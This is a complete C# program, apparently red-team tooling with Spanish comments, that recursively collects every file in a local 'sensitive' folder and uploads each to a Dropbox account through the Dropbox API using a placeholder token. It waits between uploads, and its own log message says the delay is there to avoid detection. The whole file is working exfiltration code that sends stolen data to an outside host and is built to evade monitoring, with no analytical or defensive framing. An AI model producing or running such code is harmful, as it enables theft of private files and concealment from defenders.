using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Dropbox.Api;
using Dropbox.Api.Files;

namespace RedTeamExfiltration
{
    class Program
    {
        // --- CONFIGURACIÓN ---
        private const string DropboxToken = "TOKENAQUI";
        private const string FolderToExfiltrate = @"C:\carpeta_sensible";
        private const string RemoteDestination = "/Exfiltracion_RedTeam";

        static async Task Main(string[] args)
        {
            await Exfiltrate();
        }

        static async Task Exfiltrate()
        {
            using (var dbx = new DropboxClient(DropboxToken))
            {
                // Verificar si la carpeta local existe
                if (!Directory.Exists(FolderToExfiltrate))
                {
                    Console.WriteLine($"[-] Error: La carpeta {FolderToExfiltrate} no existe.");
                    return;
                }

                Console.WriteLine($"[*] Iniciando exfiltración silenciosa desde: {FolderToExfiltrate}");

                // Obtener todos los archivos de forma recursiva
                var files = Directory.GetFiles(FolderToExfiltrate, "*.*", SearchOption.AllDirectories);
                var random = new Random();

                foreach (var localPath in files)
                {
                    try
                    {
                        // Calcular ruta relativa para replicar estructura en Dropbox
                        string relativePath = localPath.Replace(FolderToExfiltrate, "").TrimStart(Path.DirectorySeparatorChar);
                        string dropboxPath = Path.Combine(RemoteDestination, relativePath).Replace("\\", "/");

                        Console.WriteLine($"[+] Subiendo {Path.GetFileName(localPath)}...");

                        using (var stream = new FileStream(localPath, FileMode.Open, FileAccess.Read))
                        {
                            var response = await dbx.Files.UploadAsync(
                                dropboxPath,
                                WriteMode.Overwrite.Instance,
                                body: stream);
                        }

                        // --- DELAY
                        int delaySeconds = 10;
                        Console.WriteLine($"[!] Esperando {delaySeconds} segundos para evitar detección...");

                        await Task.Delay(delaySeconds * 1000);
                    }
                    catch (ApiException<UploadError> e)
                    {
                        Console.WriteLine($"[-] Error de Dropbox: {e.Message}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error inesperado: {e.Message}");
                    }
                }

                Console.WriteLine("[*] Exfiltración completada.");
            }
        }
    }
}